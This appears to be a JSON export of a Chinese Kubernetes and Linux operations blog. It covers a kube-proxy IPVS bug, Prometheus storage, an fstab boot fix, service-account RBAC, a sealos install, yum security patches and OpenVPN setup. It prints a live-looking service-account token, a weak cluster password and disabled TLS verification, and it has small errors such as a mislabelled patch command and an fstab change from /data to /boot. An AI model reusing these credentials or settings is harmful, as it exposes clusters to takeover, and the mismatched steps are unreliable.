docker://19.3.8 server88-new Ready \u0026lt;none\u0026gt; 6d v1.18.0 192.168.0.88 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1062.el7.x86_64 docker://19.3.8 查看coredns 日志,发现日志也没有什么异常。\n$ kubectl logs -f coredns-66bff467f8-9hjfd -n kube-system .:53 [INFO] plugin/reload: Running configuration MD5 = 4e235fcc3696966e76816bcd9034ebc7 CoreDNS-1.6.7 linux/amd64, go1.13.6, da7f65b 直接去coredns所在宿主机相关日志, pod节点的metrics可以访问. 发现宿主机的ipvs没有自动指向pod的ip, 也就是ipvs的规则没有自动更新.\n$ ssh server65 $ curl -I 100.87.166.173:9153 HTTP/1.1 404 Not Found Content-Type: text/plain; charset=utf-8 X-Content-Type-Options: nosniff Date: Mon, 15 Jun 2020 03:41:57 GMT Content-Length: 19 $ ipvsadm -ln | grep -A3 53 TCP 10.96.0.10:53 rr -\u0026gt; 100.87.166.169:53 Masq 1 0 0 TCP 10.96.0.10:9153 rr -\u0026gt; 100.87.166.172:9153 Masq 1 0 0 TCP 10.98.146.64:8082 rr -\u0026gt; 100.70.101.177:8082 Masq 1 0 0 TCP 10.98.252.71:80 rr -- UDP 10.96.0.10:53 rr -\u0026gt; 100.87.166.169:53 Masq 1 0 69 ## pod目前的ip为 100.87.166.173 ## ipvs的规则ip为 100.87.166.169 ## 没有自动更新 检查kube-proxy日志, 发现大量parseIP Error . 查询github相关issue_k8s_#89520后,发现是 kubenetes集群v1.18.0版本的bug. 恢复kube-proxy至老版本v1.17.4即可\n$ docker ps -a |grep kube-proxy 9dc2c99ede89 92f9a31ce92a \u0026quot;/usr/local/bin/kube…\u0026quot; 2 days ago Up 2 days k8s_kube-proxy_kube-proxy-8vkrb_kube-system_acdff2a0-4efd-447c-922d-364feb508e9e_1 0cd79c83423f k8s.gcr.io/pause:3.2 \u0026quot;/pause\u0026quot; 2 days ago Up 2 days k8s_POD_kube-proxy-8vkrb_kube-system_acdff2a0-4efd-447c-922d-364feb508e9e_1 61f229d2248e k8s.gcr.io/kube-proxy:v1.18.0 \u0026quot;/usr/local/bin/kube…\u0026quot; 2 days ago Up 2 days k8s_kube-proxy_kube-proxy-8vkrb_kube-system_acdff2a0-4efd-447c-922d-364feb508e9e_0 044d3e11dbb8 k8s.gcr.io/pause:3.2 \u0026quot;/pause\u0026quot; 2 days ago Up 2 days k8s_POD_kube-proxy-8vkrb_kube-system_acdff2a0-4efd-447c-922d-364feb508e9e_0 $ docker logs -f 61f E0610 04:19:01.916711 1 proxier.go:1192] Failed to sync endpoint for service: 10.96.0.1:443/TCP, err: parseIP Error ip=[192 168 0 31 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:01.916789 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[100 70 101 165 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:01.916808 1 proxier.go:1192] Failed to sync endpoint for service: 10.103.137.114:80/TCP, err: parseIP Error ip=[100 70 101 165 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:01.916881 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[100 116 59 71 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:01.916899 1 proxier.go:1192] Failed to sync endpoint for service: 10.96.0.10:53/UDP, err: parseIP Error ip=[100 116 59 71 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:01.916982 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[192 168 0 30 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:01.917000 1 proxier.go:1192] Failed to sync endpoint for service: 10.110.140.83:443/TCP, err: parseIP Error ip=[192 168 0 30 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965080 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[100 70 101 162 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965114 1 proxier.go:1192] Failed to sync endpoint for service: 10.109.196.2:8082/TCP, err: parseIP Error ip=[100 70 101 162 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965215 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[100 70 101 163 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965235 1 proxier.go:1192] Failed to sync endpoint for service: 10.99.176.38:8080/TCP, err: parseIP Error ip=[100 70 101 163 0 0 0 0 0 0 0 0 0 0 0 0]^C E0610 04:19:31.965359 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[100 74 166 76 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965384 1 proxier.go:1192] Failed to sync endpoint for service: 10.107.12.86:80/TCP, err: parseIP Error ip=[100 74 166 76 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965481 1 proxier.go:1950] Failed to list IPVS destinations, error: parseIP Error ip=[100 70 101 157 0 0 0 0 0 0 0 0 0 0 0 0] E0610 04:19:31.965505 1 proxier.go:1192] Failed to sync endpoint for service: 10.110.119.128:8081/TCP, err: parseIP Error ip=[100 70 101 157 0 0 0 0 0 0 0 0 0 0 0 0] 恢复操作, 更改镜像后, 立马恢复了svc解析. 问题解决.\n$ kubectl -n kube-system set image daemonset/kube-proxy *=registry.aliyuncs.com/k8sxio/kube-proxy:v1.17.6 $ dig @100.87.166.173 kubernetes.default.svc.cluster.local +short 10.96.0.1 参考  github_sealos_#361  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-svc-reslove-bug-1.18.0/","tags":["kubernetes","kuboard","prometheus","ipvs","coredns","kube-proxy"],"title":"记一次kubernetes v1.18.0 svc名称空间地址解析异常问题及解决"},{"categories":["kubernetes"],"contents":"[TOC]\n Prometheus 部署已经完成, 但是由于官方的coreos中没有持久化数据, 没有部署ingress, pod重启后数据就会消失. 所以持久化数据就显得比较重要.\n  前置要求: 已经部署了NFS或者其他存储的K8s集群.  PV示意图 部署kube-prometheus $ git clone https://github.com/coreos/kube-prometheus.git $ kubectl create -f manifests/setup $ until kubectl get servicemonitors --all-namespaces ; do date; sleep 1; echo \u0026quot;\u0026quot;; done $ kubectl create -f manifests/ 持久化数据我这里用的是NFS创建动态的pv, 具体看我以前写一篇kuberbetes 基于nfs的pvc. 也可以用cephfs. 这里不展开了. 确保已经创建了一个sc.\n$ kubectl get sc NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE storageclass.storage.k8s.io/nfs-23 nfs-nfs-23 Delete WaitForFirstConsumer false 5d2h kube-prometheus的组件简介及配置变更 从整体架构看，prometheus 一共四大组件。 exporter 通过接口暴露监控数据， prometheus-server 采集并存储数据， grafana 通过prometheus-server查询并友好展示数据， alertmanager 处理告警，对外发送。\nprometheus-operator prometheus-operator 服务是deployment方式部署，他是整个基础组件的核心，他监控我们自定义的 prometheus 和alertmanager，并生成对应的 statefulset。 就是prometheus和alertmanager服务是通过他部署出来的。\ngrafana-pvc 创建grafana的存储卷. 并修改grafana-deployment.yaml文件, 将官方的emptyDir更换为persistentVolumeClaim\n$ cd kube-prometheus/manifests/ $ cat grafana-pvc.yaml --- apiVersion: v1 kind: PersistentVolumeClaim metadata: annotations: k8s.kuboard.cn/pvcType: Dynamic pv.kubernetes.io/bind-completed: 'yes' pv.kubernetes.io/bound-by-controller: 'yes' name: grafana namespace: monitoring spec: accessModes: - ReadWriteMany resources: requests: storage: 100Gi storageClassName: nfs-23 status: accessModes: - ReadWriteMany capacity: storage: 100Gi EOF $ kubectl apply -f grafana-pvc.yaml $ vim grafana-deployment.yaml ... ##找到 grafana-storage, 添加上面创建的pvc: grafana. 然后保存. volumes: - name: grafana-storage persistentVolumeClaim: claimName: grafana ... $ kubectl apply -f grafana-deployment.yaml prometheus-k8s持久化 prometheus-server 获取各端点数据并存储与本地，创建方式为自定义资源 crd中的prometheus。 创建自定义资源prometheus后，会启动一个statefulset，即prometheus-server. 默认是没有配置持久化存储的\n这里更改配置文件.\n$ cd kube-prometheus/manifests/ $ vim prometheus-prometheus.yaml apiVersion: monitoring.coreos.com/v1 kind: Prometheus metadata: labels: prometheus: k8s name: k8s namespace: monitoring spec: alerting: alertmanagers: - name: alertmanager-main namespace: monitoring port: web storage: #这部分为持久化配置 volumeClaimTemplate: spec: storageClassName: nfs-23 accessModes: [\u0026quot;ReadWriteOnce\u0026quot;] resources: requests: storage: 100Gi nodeSelector: kubernetes.io/os: linux podMonitorNamespaceSelector: {} podMonitorSelector: {} replicas: 2 resources: requests: memory: 400Mi ruleSelector: matchLabels: prometheus: k8s role: alert-rules securityContext: fsGroup: 2000 runAsNonRoot: true runAsUser: 1000 serviceAccountName: prometheus-k8s serviceMonitorNamespaceSelector: {} serviceMonitorSelector: {} version: v2.17.2 执行变更, 这里会自动创建两个指定大小的pv（prometheus-k8s-0，prometheus-k8s-1）\n$ kubectl apply -f manifests/prometheus-prometheus.yaml 修改存储时长.\n$ vim manifests/setup/prometheus-operator-deployment.yaml .... - args: - --kubelet-service=kube-system/kubelet - --logtostderr=true - --config-reloader-image=jimmidyson/configmap-reload:v0.3.0 - --prometheus-config-reloader=quay.io/coreos/prometheus-config-reloader:v0.39.0 - storage.tsdb.retention.time=180d ## 修改存储时长 .... $ kubectl apply -f manifests/setup/prometheus-operator-deployment.yaml 添加ingress访问grafana和promethues $ cat ingress.yml --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: annotations: k8s.eip.work/workload: grafana k8s.kuboard.cn/workload: grafana generation: 2 labels: app: grafana name: grafana namespace: monitoring spec: rules: - host: k8s-moni.fenghong.tech http: paths: - backend: serviceName: grafana servicePort: http path: / --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: annotations: k8s.kuboard.cn/workload: prometheus-k8s generation: 2 labels: app: prometheus prometheus: k8s managedFields: - apiVersion: networking.k8s.io/v1beta1 name: prometheus-k8s namespace: monitoring spec: rules: - host: k8s-prom.fenghong.tech http: paths: - backend: serviceName: prometheus-k8s servicePort: web path: / 执行apply\n## 安装 ingress controller $ kubectl apply -f https://kuboard.cn/install-script/v1.18.x/nginx-ingress.yaml ## 暴露grafana及prometheus服务 $ kubectl apply -f ingress.yml 配置域名解析\n将域名 k8s-prom.fenghong.tech 解析到任意 work节点 的 IP 地址如: 192.168.0.30\n验证配置\n在浏览器访问 k8s-prom.fenghong.tech，将得到prometheus的页面\n在浏览器访问 k8s-moni.fenghong.tech，将得到grafana的访问页面\n配置kube-prometheus监控额外的项目 添加additional-scrape-configs配置文件. 例如\n$ cat monitor/add.yaml - job_name: 'prometheus' # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: - targets: ['192.168.0.23:9100', '192.168.0.21:9101', '192.168.0.61:9100', '192.168.0.62:9100', '192.168.0.63:9100', '192.168.0.64:9100', '192.168.0.89:9100', '192.168.0.11:9100'] - job_name: 'mysql' static_configs: - targets: ['192.168.0.21:9104','192.168.0.23:9104'] - job_name: 'nginx' static_configs: - targets: ['192.168.0.23:9913'] - job_name: 'elasticsearch' metrics_path: \u0026quot;/_prometheus/metrics\u0026quot; static_configs: - targets: ['192.168.0.31:9200'] 创建secret文件, 我这里部署到了monitoring 命名空间.\n$ kubectl create secret generic additional-scrape-configs --from-file=add.yaml --dry-run -oyaml \u0026gt; additional-scrape-configs.yaml $ kubectl apply -f additional-scrape-configs.yaml -n monitoring 在prometheus-prometheus.yaml中添加 additionalScrapeConfigs 选项.\n$ cat prometheus-prometheus.yaml apiVersion: monitoring.coreos.com/v1 kind: Prometheus metadata: labels: prometheus: k8s name: k8s namespace: monitoring spec: alerting: alertmanagers: - name: alertmanager-main namespace: monitoring port: web storage: #这部分为持久化配置 volumeClaimTemplate: spec: storageClassName: nfs-23 accessModes: [\u0026quot;ReadWriteOnce\u0026quot;] resources: requests: storage: 100Gi image: quay.io/prometheus/prometheus:v2.17.2 nodeSelector: kubernetes.io/os: linux podMonitorNamespaceSelector: {} podMonitorSelector: {} replicas: 3 resources: requests: memory: 400Mi ruleSelector: matchLabels: prometheus: k8s role: alert-rules securityContext: fsGroup: 2000 runAsNonRoot: true runAsUser: 1000 serviceAccountName: prometheus-k8s serviceMonitorNamespaceSelector: {} serviceMonitorSelector: {} version: v2.17.2 additionalScrapeConfigs: name: additional-scrape-configs key: add.yaml 执行apply即可\n$ kubectl apply -f prometheus-prometheus.yaml 参考  安装Kuboard kube-prometheus 安装ingress-controller  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-promtheus-persist-storage/","tags":["pvc","pv","nfs","nginxIngress","kubernetes","kuboard","prometheus"],"title":"k8s安装prometheus并持久化数据"},{"categories":["server","ops"],"contents":"[TOC]\n 一次意外停电, 公司一台linux主机重启失败, 远程获取ip失败. 只能进到机房查看问题. $表示shell, #表示注释, \u0026gt; 表示 数据库\n 问题发现 linux出现 Welcome to emergency mode 字样, 首先查看journalctl -xb. 检查问题点\n发现是某个目录挂载失败. 开机自动挂载问题/etc/fstab 是管理系统开机挂载问题的\n$ vi /etc/fstab UUID=7d1e179f-25a0-4998-9979-dc5c306c6b3f / ext4 defaults 1 1 b3f7c6e1-7583-4204-b3a3-0e7d1a727ee6 /data ext4 defaults 1 1 1532f91e-f13a-48e7-acd4-2c6fca4d8dd3 swap swap defaults 0 0 tmpfs /dev/shm tmpfs defaults 0 0 devpts /dev/pts devpts gid=5,mode=620 0 0 sysfs /sys sysfs defaults 0 0 proc /proc proc defaults 0 0 发现fastb文件写错, 以UUID挂载得写上UUID=. 填写正确的即可.\nvim /etc/fstab UUID=7d1e179f-25a0-4998-9979-dc5c306c6b3f / ext4 defaults 1 1 UUID=b3f7c6e1-7583-4204-b3a3-0e7d1a727ee6 /boot ext4 defaults 1 2 UUID=1532f91e-f13a-48e7-acd4-2c6fca4d8dd3 swap swap defaults 0 0 tmpfs /dev/shm tmpfs defaults 0 0 devpts /dev/pts devpts gid=5,mode=620 0 0 sysfs /sys sysfs defaults 0 0 proc /proc proc defaults 0 0 结语 一般linux开机出现挂载问题, 都是由于/etc/fatab文件写错导致. 更新该文件即可.\n","permalink":"https://www.fenghong.tech/blog/ops/linux-emergency-mode-resloved/","tags":["lnux","fix","mount"],"title":"记一次开机挂载导致linux重启出现紧急模式的问题及解决"},{"categories":null,"contents":"","permalink":"https://www.fenghong.tech/team/fanux/","tags":null,"title":"fanux.中弈"},{"categories":null,"contents":"","permalink":"https://www.fenghong.tech/team/ibm/","tags":null,"title":"云原生实验室"},{"categories":null,"contents":"","permalink":"https://www.fenghong.tech/team/zhangguanzhang/","tags":null,"title":"张馆长"},{"categories":null,"contents":"","permalink":"https://www.fenghong.tech/team/oldthreefeng/","tags":null,"title":"接引道人"},{"categories":null,"contents":"","permalink":"https://www.fenghong.tech/team/shaoq/","tags":null,"title":"邵欢庆"},{"categories":["kubernetes"],"contents":"[TOC]\n 所有的 Kubernetes 集群都有两类用户：Kubernetes 管理的 Service Account 和普通用户。\n普通用户由 Kubernetes 集群之外的独立服务管理，例如 keycloak、LDAP、OpenID Connect Identity Provider（Google Account、MicroSoft Account、GitLab Account）等。此类服务对用户的注册、分组、密码更改、密码策略、用户失效策略等有一系列管控过程，或者，也可以简单到只是一个存储了用户名密码的文件。Kubernetes 中，没有任何对象用于代表普通的用户账号，普通用户也不能通过 API 调用添加到 Kubernetes 集群。\n与普通用户相对，Service Account 是通过 Kubernetes API 管理的用户。Service Account 是名称空间级别的对象，可能由 ApiServer 自动创建，或者通过调用 API 接口创建。Service Account 都绑定了一组 Secret，Secret 可以被挂载到 Pod 中，以便 Pod 中的进程可以获得调用 Kubernetes API 的权限。\n对 API Server 的每次接口调用都被认为是：\n 由一个普通用户或者一个 Service Account 发起 或者是由一个匿名用户发起。  这意味着，集群内外的任何一个进程，在调用 API Server 的接口时，都必须认证其身份，或者被当做一个匿名用户。可能的场景有：\n 集群中某一个 Pod 调用 API Server 的接口查询集群的信息 用户通过 kubectl 执行指令，kubectl 调用 API Server 的接口完成用户的指令   创建Service Account example ：我想创建一个对namespace名称空间为huohua的有admin权限， 并且对其他名称空间有读权限的账号。\n如果创建 ClusterRoleBinding，则，用户可以访问集群中的所有名称空间；\n如果创建 RoleBinding，则，用户只能访问 RoleBinding 所在名称空间;\nKubernetes 集群默认预置了三个面向用户的 ClusterRole：\n view 可以查看 K8S 的主要对象，但是不能编辑 edit 具备view 的所有权限，同时，可以编辑主要的 K8S 对象 admin 具备 edit 的所有权限，同时，可以创建 Role 和 RoleBinding （在名称空间内给用户授权）  编辑weber.yaml文件, 可以为一个 Service Account 创建多个 Secret, 您可以定期更换 ServiceAccount 的 Secret Token，以增强系统的安全性.\n--- apiVersion: v1 kind: ServiceAccount metadata: name: weber namespace: huohua 创建rolebinding\n--- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: namespace: huohua roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: admin subjects: - kind: ServiceAccount name: weber namespace: huohua 创建clusterrolebinding\n--- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: view subjects: - kind: ServiceAccount name: weber namespace: huohua 使用kubectl命令行创建\n$ kubectl create serviceaccount weber -n huohua $ kubectl create clusterrolebinding weber --clusterrole=view --serviceaccount=huohua:weber -n huohua $ kubectl create rolebinding weber --clusterrole=admin --serviceaccount=huohua:weber ## 查看token。 $ kubectl get secrets -n huohua $(kubectl -n huohua get secret | awk '/weber/{print $1}') -o go-template='{{.data.token}}' | base64 -d $ kubectl describe secrets -n huohua $(kubectl -n huohua get secret | awk '/weber/{print $1}') | awk '/token:/{print $2}' 使用创建的sa账号登陆集群 使用kubectl命令创建~/.kube/config，master的ip解析apiserver.cluster.local\n$ TOKEN=$(kubectl get secrets -n huohua $(kubectl -n huohua get secret | awk '/weber/{print $1}') -o go-template='{{.data.token}}' | base64 -d) $ kubectl config set-credentials huohua-weber --token=$TOKEN $ kubectl config set-cluster ctx-apiserver-cluster.local --insecure-skip-tls-verify=true --server=https://apiserver.cluster.local:6443 $ kubectl config set-context ctx-apiserver-cluster.local --cluster=ctx-apiserver-cluster.local --user=huohua-weber $ kubectl config use-context ctx-apiserver-cluster.local $ kubectl get pods -n huohua 直接编辑~/.kube/config， master的ip解析apiserver.cluster.local\napiVersion: v1 kind: Config clusters: - cluster: insecure-skip-tls-verify: true server: https://apiserver.cluster.local:6443 name: ctx-apiserver-cluster.local contexts: - context: cluster: ctx-apiserver-cluster.local namespace: huohua user: huohua-weber name: ctx-apiserver-cluster.local preferences: {} current-context: ctx-apiserver-cluster.local users: - name: huohua-weber user: token: eyJhbGciOiJSUzI1NiIsImtpZCI6IndSVmdDbEtrX3VUWDVZTnliYmtOT0RXcWw5TTdnZkgwN3lNQUs2NjBjUWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJodW9odWEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoid2ViZXItdG9rZW4tOW0yZDciLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoid2ViZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5YmNhZDhkMS05YjMyLTQ0MTAtODE3ZC1iY2IzYTNlYTliOWQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6aHVvaHVhOndlYmVyIn0.OWeAabBT3VVCVhWq99JX84SlgRguJ6MRzkxT4jI0ZZp8Lw8AT1EdtV8rjcLBwdqj_LYHYl8dpGpbUcl1PTmZQ8bDJ3YYwYP-3ND49H360T17DRPk6ds-shs_h0VshxMNCD_UJ4jh-qMzQ9yO7k-xCbPWKrOczwh19A-cDECl2YG1mEUVtsGOb9AMMYgSwvqkHL2g7ASjhA8qvrGdqtRw3YrfNbxkdx6cOE9dRkRTviFNvSvDxBCLAKy5WfIQYr_PCzVcq3641HU6txwcPjJ46_IuH1bYpuluPq5k5vBJ6y7aFGATN1zwwOazHMoF1r8GAZE3IT5vj5sZt6m-lW3zyw 补充 上面创建的账号是对huohua这个命名空间有管理权限， 对集群有view权限， 但是对nodes是没有list权限的。\nkubectl get nodes Error from server (Forbidden): nodes is forbidden: User \u0026quot;system:serviceaccount:huohua:weber\u0026quot; cannot list resource \u0026quot;nodes\u0026quot; in API group \u0026quot;\u0026quot; at the cluster scope  虽然 view 这个 ClusterRole 具备 nodes list 权限，但由于是通过 RoleBinding 绑定到了 ServiceAccount，实际上只授权了 RoleBinding 所在名称空间的所有 view 的权限。node list 你仍然用不了\n解决： 建一个单独的clusterrole，只包含nodes list，get权限，然后用一个cluster rolebinding绑定到你的service account。 即可\n $ cat listnode.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: # \u0026quot;namespace\u0026quot; omitted since ClusterRoles are not namespaced name: listnode rules: - apiGroups: [\u0026quot;\u0026quot;] resources: [\u0026quot;nodes\u0026quot;] verbs: [\u0026quot;list\u0026quot;,\u0026quot;get\u0026quot;] --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: weber-clusterrolebinding-fspji roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: listnode subjects: - kind: ServiceAccount name: weber namespace: huohua $ kubectk apply -f listnode.yaml 这样就可以拿到读取nodes的权限了\n$ kubectl get nodes NAME STATUS ROLES AGE VERSION huohua-test Ready \u0026lt;none\u0026gt; 12d v1.18.3 k8s-master Ready master 12d v1.18.3 server65 Ready \u0026lt;none\u0026gt; 9d v1.18.3 server88-new Ready \u0026lt;none\u0026gt; 9d v1.18.3 ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-service-accout/","tags":["pv","nfs","pvc","kubernetes，rbac"],"title":"kuberbetes serviceaccout访问集群"},{"categories":["kubernetes","sealos"],"contents":"[TOC]\n 一个二进制工具加一个资源包，不依赖haproxy keepalived ansible等重量级工具，一条命令就可实现kubernetes高可用集群构建， 无论是单节点还是集群，单master还是多master，生产还是测试都能很好支持！简单不意味着阉割功能，照样能全量支持kubeadm所有配置。 立即获取sealos\n sealos特性与优势：  支持离线安装，工具与资源包（二进制程序 配置文件 镜像 yaml文件等）分离,这样不同版本替换不同离线包即可 百年证书 使用简单 支持自定义配置 内核负载，极其稳定，因为简单所以排查问题也极其简单 不依赖ansible haproxy keepalived, 一个二进制工具，0依赖 资源包放在阿里云oss上，再也不用担心网速 dashboard ingress prometheus等APP 同样离线打包，一键安装 etcd一键备份(etcd原生api调用)。支持上传至oss，实现异地备份, 用户无需关心细节。  效果图 dashboard\ngrafana\n环境准备 主机名 设置永久主机名称，然后重新登录:\n$ hostnamectl set-hostname k8s-master # 将 master 替换为当前主机名 $ cat /etc/redhat-release CentOS Linux release 7.7.1908 (Core)  设置的主机名保存在 /etc/hostname 文件中；  如果 DNS 不支持解析主机名称，则需要修改每台机器的 /etc/hosts 文件，添加主机名和 IP 的对应关系：\ncat \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt;EOF 192.168.59.128 k8s-master 192.168.59.133 k8s-node1 192.168.59.134 k8s-node2 EOF 一键安装k8s集群 $ wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/latest/sealos \u0026amp;\u0026amp; \\ chmod +x sealos \u0026amp;\u0026amp; mv sealos /usr/bin $ wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/7b6af025d4884fdd5cd51a674994359c-1.18.0/kube1.18.0.tar.gz $ sealos init --passwd 123456 \\ --master 192.168.59.128 \\ --node 192.168.59.133 \\ --node 192.168.59.134 \\ --pkg-url /root/kube1.18.0.tar.gz \\ --version v1.18.0 安装ingress-controller $ kubectl apply -f https://kuboard.cn/install-script/v1.18.x/nginx-ingress.yaml 安装k8s集群管理页面 $ sealos install --pkg-url https://github.com/sealstore/dashboard/releases/download/v1.0-1/kuboard.tar 安装k8s-prometheus监控 $ git clone https://github.com/coreos/kube-prometheus.git $ cd kube-prometheus $ kubectl create -f manifests/setup $ until kubectl get servicemonitors --all-namespaces ; do date; sleep 1; echo \u0026quot;\u0026quot;; done $ kubectl create -f manifests/ 这里官方并没有给出ingress的配置文件. 我用的如下文件.这个是用kuboard生成的默认文件. 建议用kuboard添加ingress, 方便快捷.\n--- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: annotations: k8s.eip.work/workload: grafana creationTimestamp: '2020-06-01T08:52:09Z' generation: 2 labels: app: grafana managedFields: - apiVersion: networking.k8s.io/v1beta1 fieldsType: FieldsV1 fieldsV1: 'f:metadata': {} manager: Mozilla operation: Update time: '2020-06-01T09:15:12Z' name: grafana namespace: monitoring resourceVersion: '833297' selfLink: /apis/networking.k8s.io/v1beta1/namespaces/monitoring/ingresses/grafana uid: 63c58ae7-8e4a-4d5e-a4b5-56635e3adb02 spec: rules: - host: moni.fenghong.tech http: paths: - backend: serviceName: grafana servicePort: http path: / pathType: ImplementationSpecific tls: - hosts: - moni.fenghong.tech secretName: fenghong.tech 参考  TLS Secret证书管理 安装Kuboard sealos安装k8s集群 kube-prometheus 安装ingress-controller  ","permalink":"https://www.fenghong.tech/blog/kubernetes/sealos-install/","tags":["docker","nginxIngress","kubernetes","kuboard","prometheus"],"title":"sealos 一键安装 kubernetes1.18.0[deprecated]"},{"categories":["server","ops"],"contents":"[TOC]\n 阿里云五月份的漏洞检测， 爆出了大量的高危漏洞 $表示shell, #表示注释, \u0026gt; 表示 数据库\n 1：RHSA-2019:2197-低危: elfutils security,bug fix,和 enhancement update\nyum update elfutils-libs elfutils-libelf elfutils-default-yama-scope 2：RHSA-2019:2079-中危: Xorg 安全和BUG修复更新\nyum update libX11-common libX11 libX11-devel -y 3：RHSA-2019:2030-中危: python 安全和BUG修复更新\nyum update python python-libs -y 4：RHSA-2019:3976-低危: tcpdump 安全更新\nyum update tcpdump -y 5：RHSA-2019:4190-高危: nss,nss-softokn,nss-util 安全更新\nyum update nss-softokn-freebl nss-softokn nss-util nss-tools nss-sysinit nss -y 6：RHSA-2019:2143-低危: openssh security,bug fix,和 enhancement update\nyum update openssh-server openssh openssh-clients -y 7：RHSA-2020:0203-重要: libarchive 安全更新\nyum update libarchive -y 8：RHSA-2019:2169-高危: linux-firmware security,bug fix,和 enhancement update\nyum update -y iwl2030-firmware iwl6050-firmware iwl5000-firmware \\ iwl4965-firmware iwl3945-firmware iwl135-firmware iwl7260-firmware \\ linux-firmware iwl3160-firmware iwl1000-firmware iwl6000-firmware \\ iwl105-firmware iwl2000-firmware iwl100-firmware iwl6000g2b-firmware \\ iwl6000g2a-firmware iwl5150-firmware linux-firmware iwl6050-firmware \\ iwl5000-firmware iwl4965-firmware iwl3945-firmware iwl135-firmware \\ iwl7260-firmware iwl3160-firmware iwl1000-firmware iwl6000-firmware \\ iwl105-firmware iwl2000-firmware iwl100-firmware iwl7265-firmware \\ iwl6000g2b-firmware iwl6000g2a-firmware iwl6000g2a-firmware 9：RHSA-2019:2189-中危: procps-ng 安全和BUG修复更新\nyum update procps-ng -y 10：RHSA-2019:3888-高危: ghostscript 安全更新\nyum update libgs -y ghostscript-cups ghostscript 11：RHSA-2019:4326-重要: fribidi 安全更新\nyum update fribidi -y 12：RHSA-2019:2159-低危: unzip 安全更新\nyum update unzip -y 13：RHSA-2019:2118-中危: glibc 安全和BUG修复更新\nyum update nscd glibc-common glibc glibc-headers glibc-devel -y 14：RHSA-2019:2571-高危: pango 安全更新\nyum update pango -y 15：RHSA-2019:2586-高危: ghostscript 安全更新\nyum update ghostscript -y 16：RHSA-2019:2110-中危: rsyslog 安全和BUG修复更新\nyum update rsyslog -y 17：RHSA-2019:2077-低危: ntp security,bug fix,和 enhancement update\nyum update ntp ntpdate -y 18：RHSA-2020:0124-重要: git 安全更新\nyum update perl-Git git -y 19：RHSA-2019:2091-中危: systemd security,bug fix,和 enhancement update\nyum update systemd-libs systemd-sysv libgudev1 systemd -y 20：RHSA-2019:2462-高危: ghostscript 安全更新\nyum update sudo -y 21：RHSA-2020:0630-重要: ppp 安全更新\nyum update ppp -y 22：RHSA-2019:2964-高危: patch 安全更新\nyum update patch -y 参考  博客园大佬  ","permalink":"https://www.fenghong.tech/blog/ops/aliyun-fix-bug/","tags":["bug","fix"],"title":"阿里云5月bug修复"},{"categories":["ops","iptables"],"contents":"[toc]\n 背景: 疫情期间， 在家办公让vpn突然火了起来。openvpn的udp和tcp两种模式都可以正常工作， 因为公司是通过动态拨号上网，没有固定的外网地址，所以VPN是通过映射到内网来实现. 由于端口映射导致tls错误，将udp协议改成了tcp协议。 解决了映射相关错误后 ，又重新开启了udp端口。\n $表示bash shell, #表示注释, \u0026gt; 表示数据库\n安装配置 修改配置文件\n$ cd /etc/openvpnserver/ $ cp server.conf udp.conf $ vim udp.conf # 修改proto proto udp # 修改ip, 将老的ip替换为其他的即可, 其他配置暂时不用修改 server 10.8.0.0 255.255.255.0 配置systemd文件\n$ cat /lib/systemd/system/openvpn@.service [Unit] Description=OpenVPN Robust And Highly Flexible Tunneling Application On %I After=network.target [Service] Type=notify PrivateTmp=true ExecStart=/usr/sbin/openvpn --cd /etc/openvpnserver/ --config %i.conf [Install] WantedBy=multi-user.target 解释一下\n systemd的配置文件 %i 为占位符, Unit 文件名中在 @ 符号之后的部分，不包括 @ 符号和 .service 后缀名, 详细的占位符可以查看官方文档官方  启动 $ systemctl start openvpn@server $ systemctl start openvpn@udp $ systemctl status openvpn@server 